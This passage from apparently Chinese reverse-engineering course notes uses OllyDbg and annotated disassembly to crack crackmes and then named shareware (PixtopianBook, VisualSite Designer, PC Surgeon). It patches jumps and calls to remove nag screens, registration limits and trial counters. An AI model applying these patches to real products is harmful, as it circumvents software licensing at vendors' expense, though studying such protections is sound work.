004010F7或nop\njl short 004010F7\t\t=>\tjnl short 004010F7或nop\n```\n\n{% asset_img 实验3.1.png 实验3.1 %}\n\n将修改过的痕迹全选，按照上次实验1，2保存破解版。\n\n还可以做一个补丁版，这个程序的补丁就是要将`Keyfile.dat`中的许可证变为有效的，需要仔细分析程序汇编代码，要很强的阅读汇编代码的能力。(在OD的`/`图标可查看所有打过的补丁。)\n\n修改第一个让它进入`Readfile`\n\n```asm\njnz short 0040109A\t\t=>\tjz short 0040109A或jmp short 0040109A\n```\n\n修改第二个避免让它跳出`Readfile`\n\n```asm\njnz short 004010B4\t\t=>\tjz short 004010B4或jmp short 004010B4\n```\n\n下面是`Readfile`函数实现：\n\n```asm\n0040109A   > \\6A 00         push 0x0                                 ; /pOverlapped = NULL\n0040109C   .  68 73214000   push reverseM.00402173                   ; |pBytesRead = reverseM.00402173\n004010A1   .  6A 46         push 0x46                                ; |BytesToRead = 46 (70.)\n004010A3   .  68 1A214000   push reverseM.0040211A                   ; |Buffer = reverseM.0040211A\n004010A8   .  50            push eax                                 ; |hFile = NULL\n004010A9   .  E8 2F020000   call <jmp.&KERNEL32.ReadFile>            ; \\ReadFile\n004010AE   .  85C0          test eax,eax\n004010B0      74 02         je short reverseM.004010B4\n004010B2   .  EB 43         jmp short reverseM.004010F7\n004010B4   > \\33DB          xor ebx,ebx;ebx=0\n004010B6   .  33F6          xor esi,esi;esi=0                        ;  reverseM.<ModuleEntryPoint>\n004010B8   .  833D 73214000>cmp dword ptr ds:[0x402173],0x10;ds:[0402173]要16个byte\n004010BF      7C 36         jl short reverseM.004010F7;否则跳出函数\n004010C1   >  8A83 1A214000 mov al,byte ptr ds:[ebx+0x40211A];将Buffer[0]的内容赋值到al,第二次将Buffer[1]的内容赋值到al...\n004010C7   .  3C 00         cmp al,0x0;比较al是否为0\n004010C9   .  74 08         je short reverseM.004010D3;是的话就跳转实现，到D3位置\n004010CB   .  3C 47         cmp al,0x47;比较al是否是大写字母G\n004010CD   .  75 01         jnz short reverseM.004010D0;不是的话就跳出函数\n004010CF   .  46            inc esi;esi+=1                             ;  reverseM.<ModuleEntryPoint>\n004010D0   >  43            inc ebx;ebx+=1\n004010D1   .^ EB EE         jmp short reverseM.004010C1;回到C1位置，循环\n004010D3   >  83FE 08       cmp esi,0x8;比较esi是否为8，也就是循环8次\n004010D6      7C 1F         jl short reverseM.004010F7\n004010D8   .  E9 28010000   jmp reverseM.00401205\n```\n\n所以`Keyfile.dat`中，前8个是G，长度为16，后8个字符任意。\n\n在与`ReveseMe.exe`同一目录下创建一个`Keyfile.dat`文件\n\n```\nGGGGGGGGHHHHHHHH\n```\n\n有了这个dat文件后，将原文件直接跑，也是成功的。\n\n{% asset_img 实验3.2.png 实验3.2 %}\n\n## 8. 去除NAG窗口\n\nnag窗口是软件设计者用来时不时提醒用户购买正版的警告窗口。\n\n父句柄消灭，子进程也会被消灭。\n\n### 8.1 PE结构\n\nPE(PortableExecutable)：可执行文件\n\nAOE(AddressOfEntryPoint)：程序入口地址\n\nVA(VirtualAddress)：虚拟地址\n\nRVA(RelativeVirtualAddress)：相对虚拟地址\n\nEP(EntryPoint)：程序入口点\n\nPE文件中，最下面的节区(区块)是运行一个程序真正需要的内容。上面的“头”仅仅是帮助Windows加载器定位和寻找下面区块的内容。\n\nGetModuleHandle这个API函数用于获取程序的ImageBase(基址)。\n\nMessageBox的OwnerHandle为0，可以将这个值改为一个不存在的值，例如1，这样它就找不到父句柄，就不会被显示出来。\n\n## 9. 实验四 RegisterMe\n\n{% asset_img 实验4.png 实验4 %}\n\n{% asset_img 实验4.1.png 实验4.1 %}\n\n{% asset_img 实验4.2.png 实验4.2 %}\n\n目标：去除NAG窗口。\n\nOD载入程序就看到注释区有NAG窗口的字符串。看不到的话就右键->查找->所有参考文本字串，找到第一个NAG窗口。\n\n第一种方法：\n\n```asm\nje short 00401024\t\t=>\tjmp short 00401024或jne short 00401024\n```\n\n第二种方法：\n\n```asm\n00401011  |. |6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013  |. |68 7D304000   push Register.0040307D                   ; |Title = \"Register Me\"\n00401018  |. |68 34304000   push Register.00403034                   ; |Text = \"Remove the nags to register\nThis will make program fully registered :))\"\n0040101D  |. |6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F  |. |E8 C6010000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n将MessageBoxA函数选中->右键->Binary->Fill with NOPs\n\n第三种方法：\n\n将MessageBoxA函数的父句柄改为1，因为我们没有一个父进程是1所以MessageBoxA不实现 。\n\n```asm\n0040101D  |. |6A 00         push 0x0                                 ; |hOwner = NULL\t将push 0x0\t=>\tpush 1\n```\n\n第四种方法：\n\n修改文件入口处绕过第一个NAG窗口，第二个NAG窗口再用以上三种方法解决。\n\n```asm\n00401000 >/$  6A 00         push 0x0                                 ; /pModule = NULL\n00401002  |.  E8 0D020000   call <jmp.&KERNEL32.GetModuleHandleA>    ; \\GetModuleHandleA\n00401007  |.  A3 1C314000   mov dword ptr ds:[0x40311C],eax\n0040100C  |.  83F8 00       cmp eax,0x0\n0040100F      74 13         je short Register.00401024\n00401011      6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013      68 7D304000   push Register.0040307D                   ; |Title = \"Register Me\"\n00401018      68 34304000   push Register.00403034                   ;  ASCII \"Remove the nags to register\\r\\nThis will make program fully registered :))\"\n0040101D      6A 00         push 0x0\n0040101F      E8 C6010000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401024  |> \\6A 0A         push 0xA                                 ; /Arg4 = 0000000A\n00401026  |.  FF35 20314000 push dword ptr ds:[0x403120]             ; |Arg3 = 00000000\n0040102C  |.  6A 00         push 0x0                                 ; |Arg2 = 00000000\n0040102E  |.  FF35 1C314000 push dword ptr ds:[0x40311C]             ; |Arg1 = 00000000\n00401034  |.  E8 19000000   call Register.00401052                   ; \\Register.00401052\n00401039  |.  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n0040103B  |.  68 7D304000   push Register.0040307D                   ; |Title = \"Register Me\"\n00401040  |.  68 89304000   push Register.00403089                   ; |Text = \"Oops! I am not registered !!\"\n00401045  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n00401047  |.  E8 9E010000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n0040104C  |.  50            push eax                                 ; /ExitCode = 0x19FFCC\n0040104D  \\.  E8 BC010000   call <jmp.&KERNEL32.ExitProcess>         ; \\ExitProcess\n```\n\n程序原本的入口点在401000地址，绕过MessageBoxA，那就修改程序入口点为401024。\n\n点击图标M，M是内存分布表，找到401000地址的PE头：\n\n```asm\nMemory map, item 14\n Address=00400000\n Size=00001000 (4096.)\n Owner=Register 00400000 (itself)\n Section=\n Contains=PE header\n Type=Imag 01001002\n Access=R\n Initial access=RWE\n```\n\n双击这一行，会弹出D图标，找到“Offset to PE signature”，PE头开始的地方。\n\n```asm\nVA\t\t\t内存RVA\t\t人类易读RVA\t\t\t\t注释\n0040003C    C0000000    DD 000000C0          ; Offset to PE signature\n```\n\n再去找RVA为000000C0也就是VA为4000C0地址的地方。找到AOE，它的VA是4000E8。\n\n```asm\n004000E8     00100000    DD 00001000          ;  AddressOfEntryPoint = 0x1000\n```\n\n返回图标C的数据窗口，Ctrl+G快速定位到4000E8，存的是00 10 00 00，由于是小端序存储，我们要改成24 10 00 00，就能绕过第一个NAG窗口。\n\n选中24，即我们修改过的地方，右键->复制到可执行文件->右键->备份->复制数据到文件。如果修改第二个NAG要从半破解版程序的基础上改(因为数据窗口和反汇编窗口都要选中再复制到可执行文件我不会)。\n\n### 9.1 RegisterMe.Oops\n\n双击竟然打不开。OD运行也打不开。奇奇怪怪，是我这个程序有问题吧！！但还是可以看汇编代码的。\n\n查看PE头，也是400000-401000正常值，但是点进PE头会发现某些数值大得离谱。\n\n```asm\n004000C0    50 45 00 00>ASCII \"PE\"           ; PE signature (PE)\n004000C4    4C01        DW 014C              ; Machine = IMAGE_FILE_MACHINE_I386\n004000C6    0400        DW 0004              ;  NumberOfSections = 0x4\n004000C8    1E29D138    DD 38D1291E          ;  TimeDateStamp = 0x38D1291E\n004000CC    00000000    DD 00000000          ;  PointerToSymbolTable = 0x0\n004000D0    00000000    DD 00000000          ;  NumberOfSymbols = 0x0\n004000D4    E000        DW 00E0              ;  SizeOfOptionalHeader = E0 (224.)\n004000D6    0F01        DW 010F              ;  Characteristics = EXECUTABLE_IMAGE|32BIT_MACHINE|RELOCS_STRIPPED|LINE_NUMS_STRIPPED|LOCAL_SYMS_STRIPPED\n004000D8    0B01        DW 010B              ; MagicNumber = PE32\n004000DA    05          DB 05                ;  MajorLinkerVersion = 0x5\n004000DB    0C          DB 0C                ;  MinorLinkerVersion = C (12.)\n004000DC    00040040    DD 40000400          ;  SizeOfCode = 40000400 (1073742848.)改为400\n004000E0    000A0040    DD 40000A00          ;  SizeOfInitializedData = 40000A00 (1073744384.)改为A00\n004000E4    00000000    DD 00000000          ;  SizeOfUninitializedData = 0x0\n004000E8    00100000    DD 00001000          ;  AddressOfEntryPoint = 0x1000\n004000EC    00100040    DD 40001000          ;  BaseOfCode = 0x40001000改为1000\n004000F0    00200040    DD 40002000          ;  BaseOfData = 0x40002000改为2000\n004000F4    00004000    DD 00400000          ; ImageBase = 0x400000\n004000F8    00100000    DD 00001000          ;  SectionAlignment = 0x1000\n004000FC    00020000    DD 00000200          ;  FileAlignment = 0x200\n00400100    0400        DW 0004              ;  MajorOSVersion = 0x4\n00400102    0000        DW 0000              ;  MinorOSVersion = 0x0\n00400104    0000        DW 0000              ;  MajorImageVersion = 0x0\n00400106    0000        DW 0000              ;  MinorImageVersion = 0x0\n00400108    0400        DW 0004              ;  MajorSubsystemVersion = 0x4\n0040010A    0000        DW 0000              ;  MinorSubsystemVersion = 0x0\n0040010C    00000000    DD 00000000          ;  Reserved\n00400110    00500000    DD 00005000          ;  SizeOfImage = 5000 (20480.)\n00400114    00040000    DD 00000400          ;  SizeOfHeaders = 400 (1024.)\n00400118    99B40000    DD 0000B499          ;  CheckSum = 0xB499\n0040011C    0200        DW 0002              ;  Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI\n0040011E    0000        DW 0000              ;  DLLCharacteristics = 0x0\n00400120    00001000    DD 00100000          ;  SizeOfStackReserve = 100000 (1048576.)\n00400124    00100000    DD 00001000          ;  SizeOfStackCommit = 1000 (4096.)\n00400128    00001000    DD 00100000          ;  SizeOfHeapReserve = 100000 (1048576.)\n0040012C    00100000    DD 00001000          ;  SizeOfHeapCommit = 1000 (4096.)\n00400130    00000000    DD 00000000          ;  LoaderFlags = 0x0\n00400134    04000040    DD 40000004          ;  NumberOfRvaAndSizes = 40000004 (1073741828.)改为10\n00400138    00005000    DD 00500000          ;  Export Table address = 0x500000改为0\n0040013C    00000500    DD 00050000          ;  Export Table size = 50000 (327680.)改为0\n00400140    50200000    DD 00002050          ;  Import Table address = 0x2050\n00400144    3C000000    DD 0000003C          ;  Import Table size = 3C (60.)\n00400148    00400000    DD 00004000          ;  Resource Table address = 0x4000\n0040014C    9C030000    DD 0000039C          ;  Resource Table size = 39C (924.)\n00400150    00000000    DD 00000000          ;  Exception Table address = 0x0\n00400154    00000000    DD 00000000          ;  Exception Table size = 0x0\n```\n\n右键->modify integer修改以上数值。修改完后返回C图标的数据窗口，Ctrl+G定位到我们修改过的地方，选中保存。保存后的程序就跟RegisterMe一样了。\n\n## 10. SEH\n\n### 10.1 Windows程序异常\n\nSEH(Structured Exception Handling)：结构化异常处理\n\nSEH是Windows操作系统提供的功能，跟开发工具无关。\n\nWindows程序设计中最重要就是消息传递，事件驱动。当GUI应用程序触发一个消息时，系统将把该消息放入消息队列，然后去查找并调用窗体的消息处理函数(CALLBACK)，传递的参数就是这个消息。\n\n异常也当作一种消息，应用程序发生异常时就触发了该消息并告知系统。系统接收后同样会找它的“回调函数”，也就是我们的异常处理例程。\n\n如果在程序中没有做异常处理的话，系统也不会置之不理，它将弹出常见的应用程序错误框，然后结束该程序。\n\n在OD中，Shift+F7/F8/F9来忽略程序异常。或者在Options->Debugging options->Exceptions->Add range->00000000~FFFFFFFF(32位整个内存段)\n\n## 11. 实验五 pixtopianbook\n\n{% asset_img 实验5.png 实验5 %}\n\n{% asset_img 实验5.2.png 实验5.2 %}\n\n目标：突破每组只能有4个联系人，只能创建3个组，去除未注册信息，注册版本爆破。\n\nOD载入程序，F9运行程序，弹出界面。\n\n(如果没有弹出界面，可能是在异常处中断了。在OD中，Shift+F7/F8/F9来忽略程序异常。或者在Options->Debugging options->Exceptions->Add range->设置00000000~FFFFFFFF(32位整个内存段))\n\n**突破4个联系人**\n\n为什么不能右键->查找->所有参考文本字串？我猜可能是因为触发错误异常的弹窗文本不计入内？\n\n但可以右键->中文搜索引擎->智能搜索，查看字符串。一下子就找到了下面的汇编代码。\n\n另一种方法：\n\n已知我们准备添加第5个联系人时程序会弹窗，在Command窗口设置软断点`bp MessageBoxA`，意味着当程序执行到有 MessageBoxA 的地方就会停止程序运行。回到界面添加联系人，程序没有反应，但回到OD看已经来到了MessageBoxA处(进到MessageBoxA函数里)。一路F8单步单过，到达call User32.MessageBoxA，程序弹出错误框，按确定(“确定”按不了可能是因为显示弹框的线程在调试的时候被暂停了，没恢复过来就会卡住。这时按F12暂停，再F9运行，就可以按“确定”了；或者到T图标，在界面处右键->Resume All Threads。这两种方法原理差不多)，F8到ret指令，返回到上一级函数位置，查看上下代码没什么有用的信息。再一路F8返回上一级，查看上下汇编代码。\n\n```asm\n00412DD0                       .  83F8 04       cmp eax,0x4;eax与4对比\n00412DD3                       .  7C 1A         jl short Pixtopia.00412DEF;跳到EF，可以跳过E5的弹窗\n00412DD5                       .  8B4C24 10     mov ecx,dword ptr ss:[esp+0x10]\n00412DD9                       .  6A 10         push 0x10\n00412DDB                       .  68 00F74800   push Pixtopia.0048F700                   ;  ASCII \"Please register PixtopianBook\"\n00412DE0                       .  68 68FC4800   push Pixtopia.0048FC68                   ;  ASCII \"You've reached the limit of 4 entries per group.\\n\\nPlease register PixtopianBook today!\"\n00412DE5                       .  E8 03350400   call Pixtopia.004562ED;间接调用MessageBox函数\n00412DEA                       .  E9 DD000000   jmp Pixtopia.00412ECC\n00412DEF                       > \\8D4C24 14     lea ecx,dword ptr ss:[esp+0x14]\n00412DF3                       .  E8 38610100   call Pixtopia.00428F30\n00412DF8                       .  68 D8784900   push Pixtopia.004978D8\n```\n\n```asm\njl short Pixtopia.00412DEF\t\t=>\t\tjmp short Pixtopia.00412DEF\n```\n\n大程序的话建议修改一处就保存一次，因为会遇到很多分岔路，很多陷阱。然后在修改过的程序做第二次修改，以此类推。\n\n**突破3个组**\n\n按上述方法\n\n```asm\n00408B05                       .  83F8 03       cmp eax,0x3;跟3比较\n00408B08                       .  7C 2A         jl short Pixtopia.00408B34;跳到34，可以跳过18的弹窗\n00408B0A                       .  6A 10         push 0x10\n00408B0C                       .  68 00F74800   push Pixtopia.0048F700                   ;  ASCII \"Please register PixtopianBook\"\n00408B11                       .  68 B4F64800   push Pixtopia.0048F6B4                   ;  ASCII \"You've reached the limit of 3 groups.\\n\\nPlease register PixtopianBook today!\"\n00408B16                       .  8BCB          mov ecx,ebx\n00408B18                       .  E8 D0D70400   call Pixtopia.004562ED;间接调用MessageBox函数\n00408B1D                       .  5E            pop esi                                  ;  Pixtopia.004761E8\n00408B1E                       .  5B            pop ebx                                  ;  Pixtopia.004761E8\n00408B1F                       .  8B8C24 340100>mov ecx,dword ptr ss:[esp+0x134]         ;  Pixtopia.00456A5E\n00408B26                       .  64:890D 00000>mov dword ptr fs:[0],ecx\n00408B2D                       .  81C4 40010000 add esp,0x140\n00408B33                       .  C3            retn\n00408B34                       > \\6A 00         push 0x0\n00408B36                       .  8D4C24 24     lea ecx,dword ptr ss:[esp+0x24]\n00408B3A                       .  E8 21E20100   call Pixtopia.00426D60\n```\n\n```asm\njl short Pixtopia.00408B34\t\t=>\t\tjmp short Pixtopia.00408B34\n```\n\n如果是两次一起保存，右键->复制到可执行文件->所有修改。\n\n**去除未注册信息**\n\n查找`UNREGISTERED`字符串。\n\n到M图标查找字符串，Ctrl+B或右键->查找，在ASCII找一下。\n\n```\n0048F97F  75 6E 72 65 67 69 73 74 65 72 65 64 20 76 65 72  unregistered ver\n0048F98F  73 69 6F 6E 20 6F 66 20 50 69 78 74 6F 70 69 61  sion of Pixtopia\n0048F99F  6E 42 6F 6F 6B 2E 20 50 6C 65 61 73 65 20 72 65  nBook. Please re\n0048F9AF  67 69 73 74 65 72 20 74 6F 64 61 79 21 00 00 00  gister today!...\n0048F9BF  00 43 49 6E 69 74 44 69 61 6C 6F 67 42 61 72 00  .CInitDialogBar.\n0048F9CF  00 43 4C 65 66 74 46 6F 72 6D 56 69 65 77 00 00  .CLeftFormView..\n0048F9DF  00 4E 6F 74 65 20 20 20                          .Note\n```\n\n选中要修改的地方，右键->二进制->编辑，选中保持大小，因为可能会有对齐方面的问题，意味着我们写的长度不能比它长。由于不能直接在M图标中保存，所以要返回到C图标保存。记住地址起始处48F97F，返回到C图标的数据窗口快速定位Ctrl+G，右键->复制到可执行文件->右键->保存文件。\n\n{% asset_img 实验5.4.png 实验5.4 %}\n\n再次查找ASCII还有没有UNREGISTERED字符串，重复上述步骤，查完ASCII再查UNICODE，重复上述步骤。\n\n**去除上面图片的注册信息**\n\n一样在M图标查找字符串，回到C的数据窗口查找。选中开始字节右键->查找参考->双击，就会去到字符串的反汇编窗口。查看上下汇编代码\n\n```asm\n0040C22F   > \\81FD 07090000 cmp ebp,0x907\n0040C235   .  75 1A         jnz short Pixtopia.0040C251;让它跳，绕过37地址\n0040C237   .  68 74F94800   push Pixtopia.0048F974                   ;  ASCII \"This is an registered version for v5leon9 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\"\n0040C23C   .  8BCE          mov ecx,esi\n0040C23E   .  E8 BDFEFFFF   call Pixtopia.0040C100\n0040C243   .  8B56 1C       mov edx,dword ptr ds:[esi+0x1C]\n0040C246   .  6A 01         push 0x1                                 ; /Erase = TRUE\n0040C248   .  6A 00         push 0x0                                 ; |pRect = NULL\n0040C24A   .  52            push edx                                 ; |hWnd = NULL\n0040C24B   .  FF15 E4564700 call dword ptr ds:[<&USER32.InvalidateRe>; \\InvalidateRect\n0040C251   >  55            push ebp\n0040C252   .  8BCE          mov ecx,esi\n0040C254   .  E8 7F230500   call Pixtopia.0045E5D8\n```\n\n```asm\njnz short Pixtopia.0040C251\t\t=>\t\tjz short Pixtopia.0040C251\n```\n\n### 11.1 查找字符串的几种方法\n\n1. 右键->查找->所有参考文本字串\n2. 右键->中文搜索引擎->智能搜索\n3. M图标右键查找字符串\n\n## 12. OD两种断点\n\nOD从原理上来区分，有两种不同的断点：软件断点和硬件断点。\n\n内存断点属于一种特殊的软件断点。\n\n- 内存断点每次只能设置一个，如果设置了另一个，上一个会被自动删除。\n- 设置一个内存断点，会改变整块(4KB)内存的属性。\n- 内存断点明显降低OD性能，因为OD经常校对内存。\n\n软件断点：\n\n- F2设置的断点就是软件断点。\n- 设置该断点的原理是在断点处重写代码，插入一个int 3中断指令，当CPU执行到int 3指令的时候，OD就可以获得控制权。\n\n硬件断点：\n\n- 可行性依赖于CPU的物理支持。\n- 调试寄存器Dr0\\~Dr7，其中Dr0\\~Dr3寄存器用来存放中断地址，Dr4、Dr5保留不使用，Dr6、Dr7用来记录Dr0~Dr3的属性(如读、写还是执行，单位是字节、字还是双字)，所以硬件断点最多只能有4个。\n\n软件断点只能在OD的CPU界面下，在数据段下不了，在一条指令的中间也下不了。\n\n硬件断点可以下在Windows的动态链接库里，因为软件断点下在DLL文件中不会被保存，重启程序后将丢失断点。\n\n## 13. 实验六 VisualSite Designer\n\n{% asset_img 实验6.png 实验6 %}\n\n{% asset_img 实验6.1.png 实验6.1 %}\n\n目标：破除只能打开10次的限制，去除软件关闭后弹出的广告。\n\n**破除打开10次的限制**\n\n小技巧：用杀毒软件的沙盘模式运行不会减少次数，因为在沙盘里面只是虚拟出一个环境，将用户模式与底层之间再加一层分隔开，次数是通过写入文件或写入注册表的形式来计算的。当关闭沙盘时，沙盘的文件清空，记录的数据也不复存在。\n\nCtrl+F8自动步过遇到问题下断点，F7步入。重复以上。\n\n> 程序跳出循环的办法：在循环的下一条指令下断点，按F9运行。\n\n仔细看下面这条断点指令，jmp到MFC42里面，mfc42.dll是windows系统的一个动态链接文件，不可或缺。\n\n```asm\n004BD520  |.  E8 43000000   call <jmp.&MFC42.#AfxWinMain_1576>\n```\n\n所以接下来我们会去到DLL的段，下断点的方式与之前不同，右键->断点->硬件执行。可在调试->硬件断点处查看。\n\n```asm\n6E344F38    FFD6            call esi                        ; VisualSi.0058B264\n```\n\n一般地址数值较大的是存放DLL的领空。\n\n综上，在用户领空就下软件断点，在动态链接库领空就下硬件断点。\n\n走到下面这条指令还需要继续往下走吗？我们试试。\n\n```asm\n00489912   .  E8 132B0300   call <jmp.&MFC42.#CDialog::DoModal_2514>\n```\n\n又走到了一个DLL领空，下硬件断点，继续步入。\n\n```asm\n6E370AD8    E8 73D6FEFF     call mfc42.#CWnd::RunModalLoop_5718\n```\n\n发现我们一直在DLL领空死循环，NAG窗口出来了。但是我们在DLL领空操作不了，所以找最近跳转的用户领空就可以了。回到用户断点处。\n\n```asm\n00489912   .  E8 132B0300   call <jmp.&MFC42.#CDialog::DoModal_2514>\n```\n\nF8步过，弹出窗口，在窗口处点一下进入程序，OD跳到下一条指令，窗口消失，call指令完成。即call指令执行的是打开NAG窗口，让次数-1，返回值存到eax里去。下一条指令是eax与1对比，eax是1就进入到程序里去，非1退出程序。可以在call指令后面添加注释返回值要为1。\n\n```asm\n00489912   .  E8 132B0300   call <jmp.&MFC42.#CDialog::DoModal_2514>;NAG,return 1\n00489917   .  83F8 01       cmp eax,0x1\n```\n\n那怎么才能让返回值为1呢？简单粗暴的方法就是直接改call指令。\n\n```asm\ncall <jmp.&MFC42.#CDialog::DoModal_2514>\t\t=>\t\tmov eax,1\n```\n\n将修改的保存起来。OD载入新程序，F9运行，会发现一开始NAG窗口已经不见了。\n\n**去除软件关闭后弹出的广告**\n\nOD载入新程序，F9运行，进入程序，点关闭按钮，会弹出广告，这时回到OD按F12暂停，停在了win32u模块，dll领空。查看K图标，K的作用是：截止到暂停处，通过调用堆栈判断出哪些函数被调用过。\n\n```asm\n地址       堆栈       函数过程 / 参数                       调用来自                      结构\n0019EAF0   75A45E55   win32u.NtUserGetMessage               user32.75A45E4F               0019EB2C\n0019EB30   6E344425   user32.GetMessageA                    mfc42.6E34441F                0019EB2C\n0019EB34   0058B264     pMsg = VisualSi.0058B264\n0019EB38   00000000     hWnd = NULL\n0019EB3C   00000000     MsgFilterMin = 0x0\n0019EB40   00000000     MsgFilterMax = 0x0\n0019EB4C   6E35E253   包含mfc42.6E344425                      mfc42.6E35E251                0019EB70\n0019EB74   6E370ADD   mfc42.#CWnd::RunModalLoop_5718        mfc42.6E370AD8                0019EB70\n0019EBBC   00480C29   ? <jmp.&MFC42.#CDialog::DoModal_2514  VisualSi.00480C24             0019EBB8\n0019EC2C   6E3478D5   包含VisualSi.00480C29                   mfc42.6E3478D3                0019EC30\n0019EC34   6E33C51B   mfc42.6E3478C0                        mfc42.6E33C516                0019EC30\n0019ECCC   6E343B84   包含mfc42.6E33C51B                      mfc42.6E343B82                0019ECC8\n0019ECF4   6E33BD7B   包含mfc42.6E343B84                      mfc42.6E33BD79                0019ECF0\n0019ED74   6E33BC2F   mfc42.#AfxCallWndProc_1109            mfc42.6E33BC2A                0019ED70\n0019EDBC   75A636DB   包含mfc42.6E33BC2F                      user32.75A636D9               0019EDB8\n0019EDE8   75A5A66A   user32.75A636B0                       user32.75A5A665               0019EDE4\n0019EECC   75A5A26A   user32.75A5A330                       user32.75A5A265               0019EEC8\n0019EF30   75A5DE3F   包含user32.75A5A26A                     user32.75A5DE3D               0019EF2C\n0019EF6C   77624E9D   包含user32.75A5DE3F                     ntdll.77624E9B                0019EF68\n```\n\n发现几乎大部分的函数都在操作系统领空，除了一个是在用户领空的，双击这行的“调用来自”，进入用户领空。\n\n```asm\n0019EBBC   00480C29   ? <jmp.&MFC42.#CDialog::DoModal_2514  VisualSi.00480C24             0019EBB8\n```\n\n在00480C24处下个断点。重新载入程序运行，关闭，没有弹出广告，OD停在了断点处。\n\n```asm\n00480C24   .  E8 01B80300   call <jmp.&MFC42.#CDialog::DoModal_2514>\n00480C29   .  8D4C24 00     lea ecx,dword ptr ss:[esp]\n```\n\n如果按F8，广告弹出，关闭广告，跳到下一条指令。即`call <jmp.&MFC42.#CDialog::DoModal_2514>`的作用就是用来弹出广告的。那我们不想要它弹广告，就将这条指令用`nop`填充。\n\n```asm\ncall <jmp.&MFC42.#CDialog::DoModal_2514>\t\t=>\t\tnop\n```\n\n保存到新程序。OD载入查看，没有倒数，关闭也没有广告了。\n\n### 13.1 破解的绝对方案\n\n就VisualSite Designer来说，程序的行为发生改变，在于注册前和注册后的行为发生改变。如果运行完10次后，程序就不允许我们打开，代码走的路线与之前的不同。用什么来实现代码走的路线不同呢？一种是条件判断(低级)，另一种是jmp+变量(高级)。\n\n#### 13.1.1 条件判断\n\nVisualSite Designer就是用条件判断来选择代码实现。\n\n从程序入口点开始，一路F8，遇到条件跳转指令特别注意，跳转已实现用“Y”注释，跳转未实现用“N”注释。一直注释下去，直到弹出倒数窗口，下断点，重载，运行，删断点，进去注释，弹出倒数窗口，下断点，以此类推，直到弹出最后一个NAG窗口(也就是之前我们走到的用户地址9912处)。\n\n以下情况可以不用注释：\n\n1. 如果跳转指令在循环里面可以不用理会，因为循环里面的跳转只是为了实现循环。\n2. 如果跳转指令在动态链接库的领空也可以不用理会，因为我们暂时不能修改动态链接库的东西(如果跳转进到动态链接库可以按Alt+F9返回到用户领空)。\n3. 如果遇到无条件跳转指令jmp也不用理会，因为这个程序没有jmp+变量的高级跳转。\n\n注释完后，在OD里将原来的程序次数用到0。再载入OD，F8对着注释查看条件跳转指令是否改变，如果发生改变根据我们之前学过的绕过跳转指令来实现程序原本功能。(将程序次数用到0，我们之前修改的1，2版本也不能用了，因为它们用的都是同一个文件或注册表)\n\n```asm\n004898EF   .  85C0          test eax,eax;在信息窗口可以看到eax=0\n004898F1   . /0F8E A1000000 jle VisualSi.00489998                    ;  n\n```\n\n```asm\ntest eax,eax\t\t=>\t\tmov eax,1\n```\n\n{% asset_img 实验6.2.png 实验6.2 %}\n\n现在是0也可以进入程序了，再结合去除NAG窗口和关闭后弹出的广告就完美了！(这个程序也避免了原来程序用完次数，导致1、2也用不了的情况)\n\n这种方法破解程序屡试不爽，同时需要大量的耐心。\n\n## 14. 实验七 PC Surgen\n\n{% asset_img 实验7.png 实验7 %}\n\n{% asset_img 实验7.1.png 实验7.1 %}\n\n{% asset_img 实验7.2.png 实验7.2 %}\n\n(这个程序在Win10一直报错，界面呈现也不对，所以拿我的Windows 2003靶机来调试吧)\n\n目标：去除NAG窗口，去除未注册信息，解除天数限制。\n\n这个程序弹出NAG窗口后等几秒后会自动进入到界面。NAG窗口很大可能是破解的切入点，因为只要找到了NAG的触发点，也就是找到了注册和未注册的跳转、判断位置。\n\n### 14.1 基本的打补丁方式(暴力破解)\n\nOD载入程序，运行到界面处。\n\n看到图2标题，它说未注册，还剩5天时间。那可不可以像实验五那样直接改字符串呢？肯定不可以啊，因为那个倒数是动态的，应该是有内置函数用来算倒数的，这样的话覆盖到函数部分会发生错误，很有可能程序都打不开。\n\n在C图标里右键->查找->所有参考文本字符串，弹窗R图标，右键->查找文本，查找`<unregistered`，将“区分大小写”与“整个范围”勾上。如果光标处不是想要找的字符串，可以右键->查找下一个(Ctrl+L)。找到你所需要的字符串，双击去到汇编代码处。\n\n```asm\n005CC836   . /0F85 F9000000 jnz pcsurgeo.005CC935\n005CC83C   . |68 70CB5C00   push pcsurgeo.005CCB70                   ;  ASCII 50,\"C Surgeon <unregistered - \"\n005CC841   . |D905 3CCA5C00 fld dword ptr ds:[0x5CCA3C]\n005CC847   . |A1 8CEC6000   mov eax,dword ptr ds:[0x60EC8C]\n005CC84C   . |DC20          fsub qword ptr ds:[eax]\n005CC84E   . |83C4 F4       add esp,-0xC\n005CC851   . |DB3C24        fstp tbyte ptr ss:[esp]\n005CC854   . |9B            wait\n005CC855   . |8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]\n005CC858   . |B8 94CB5C00   mov eax,pcsurgeo.005CCB94                ;  UNICODE \"0\"\n005CC85D   . |E8 42FAE3FF   call pcsurgeo.0040C2A4\n005CC862   . |FF75 E4       push dword ptr ss:[ebp-0x1C]\n005CC865   . |68 A0CB5C00   push pcsurgeo.005CCBA0                   ;  ASCII 20,\"days remaining..>\"\n005CC86A   . |8D45 E8       lea eax,dword ptr ss:[ebp-0x18]\n005CC86D   . |BA 03000000   mov edx,0x3\n005CC872   . |E8 A98AE3FF   call pcsurgeo.00405320\n005CC877   . |8B55 E8       mov edx,dword ptr ss:[ebp-0x18]          ;  gdi32.77C11307\n005CC87A   . |8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n005CC87D   . |E8 22D5EAFF   call pcsurgeo.00479DA4\n005CC882   . |8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n005CC885   . |8B80 20120000 mov eax,dword ptr ds:[eax+0x1220]\n005CC88B   . |C680 20030000>mov byte ptr ds:[eax+0x320],0x1\n005CC892   . |8B10          mov edx,dword ptr ds:[eax]\n005CC894   . |FF92 EC000000 call dword ptr ds:[edx+0xEC]\n005CC89A   . |8D45 F4       lea eax,dword ptr 